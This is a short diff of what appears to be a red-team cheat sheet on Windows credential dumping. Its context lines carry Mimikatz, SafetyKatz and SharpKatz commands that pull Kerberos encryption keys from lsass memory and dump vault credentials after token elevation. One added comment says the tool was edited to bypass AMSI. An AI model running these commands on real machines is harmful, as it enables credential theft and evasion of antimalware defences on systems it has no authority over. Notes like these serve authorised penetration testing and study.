@@ -23,7 +23,9 @@ Therefore, it possible to dump Kerberos encryption keys using `sekurlsa::ekeys`.
 # Dump credentials on a local machine using Mimikatz.
 Invoke-Mimikatz -Command '"sekurlsa::ekeys"' 
 
+
 # Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
+# Used evasive-keys to bypass ASMI and has been edited in the source code
 SafetyKatz.exe "sekurlsa::ekeys" 
 
 # Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality).
@@ -56,5 +58,3 @@ Enumerates vault credentials of scheduled tasks.
 ```powershell
 Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
 ```
-
-####
